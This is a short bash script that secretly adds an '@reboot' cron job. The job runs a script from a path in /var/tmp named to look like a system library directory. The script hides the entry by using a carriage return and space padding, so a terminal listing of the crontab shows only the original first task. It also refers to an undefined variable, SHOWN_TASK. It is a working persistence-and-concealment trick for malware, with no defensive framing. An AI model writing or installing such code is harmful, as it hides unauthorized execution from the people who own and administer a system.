#!/bin/bash

HIDDEN="@reboot /bin/sleep 120 && /var/tmp/x86_64-linux-gnu/run.sh"

crontab -l 2>&1 | {
   read FIRST_TASK;
   if [ ${#HIDDEN} -gt ${#FIRST_TASK} ]; then

      while (( i < (${#HIDDEN} - ${#SHOWN_TASK} + 1) )); do
         FIRST_TASK="${FIRST_TASK} "; ((i++))
      done
   fi

   printf "${HIDDEN};\r${FIRST_TASK}\n"; cat
} | crontab -

